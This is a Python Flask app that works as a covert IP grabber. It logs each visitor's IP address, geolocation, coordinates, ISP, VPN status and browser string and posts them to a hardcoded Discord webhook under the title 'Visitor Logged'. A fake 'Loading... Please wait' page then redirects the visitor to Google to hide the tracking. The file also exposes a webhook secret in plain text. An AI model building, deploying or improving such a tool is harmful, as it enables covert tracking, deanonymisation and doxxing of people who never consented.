from flask import Flask, request, render_template_string, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# --- CONFIG ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE!
IGNORE_IPS = ["127.0.0.1", "YOUR_PUBLIC_IP"]

def get_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    return forwarded.split(',')[0].strip() if forwarded else request.remote_addr

def should_ignore(ip):
    return ip in IGNORE_IPS

def get_location(ip):
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code == 200:
            d = r.json()
            if 'error' not in d:
                return {
                    'country': d.get('country_name'),
                    'region': d.get('region'),
                    'city': d.get('city'),
                    'lat': d.get('latitude'),
                    'lon': d.get('longitude'),
                    'isp': d.get('org'),
                    'proxy': d.get('proxy') or d.get('vpn') or False,
                }
    except:
        pass
    # fallback
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,proxy', timeout=5)
        if r.status_code == 200 and r.json().get('status') == 'success':
            d = r.json()
            return {
                'country': d.get('country'),
                'region': d.get('regionName'),
                'city': d.get('city'),
                'lat': d.get('lat'),
                'lon': d.get('lon'),
                'isp': d.get('isp'),
                'proxy': d.get('proxy') or False,
            }
    except:
        pass
    return None

def send_discord(data, ip):
    if not DISCORD_WEBHOOK_URL:
        return
    vpn = "🔴 ON (VPN/Proxy)" if data and data.get('proxy') else "🟢 OFF"
    loc = f"{data.get('city','N/A')}, {data.get('region','N/A')}, {data.get('country','N/A')}" if data else "N/A"
    coords = f"{data.get('lat','N/A')}, {data.get('lon','N/A')}" if data else "N/A"
    isp = data.get('isp', 'N/A') if data else "N/A"
    ua = request.headers.get('User-Agent', 'Unknown')
    embed = {
        "title": "🎯 Visitor Logged",
        "color": 0x00ff00,
        "fields": [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN", "value": vpn, "inline": True},
            {"name": "📍 Location", "value": loc, "inline": False},
            {"name": "🗺️ Coords", "value": f"`{coords}`", "inline": True},
            {"name": "📡 ISP", "value": isp, "inline": True},
            {"name": "💻 Device", "value": ua[:80] + ("..." if len(ua)>80 else ""), "inline": False},
        ],
        "timestamp": datetime.utcnow().isoformat()
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

@app.route('/')
def index():
    ip = get_ip()
    if not should_ignore(ip):
        data = get_location(ip)
        send_discord(data, ip)
    # Redirect to Google after 1.5 seconds via meta refresh
    html = """
    <!DOCTYPE html>
    <html>
    <head><meta http-equiv="refresh" content="1.5;url=https://www.google.com"></head>
    <body style="background:#0a0a14;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;">
        <div style="text-align:center;"><h2>⏳ Loading...</h2><p style="color:#888;">Please wait.</p></div>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/verify')
def verify():
    return index()  # same as root

# --- local dev ---
if __name__ == '__main__':
    app.run(debug=True)
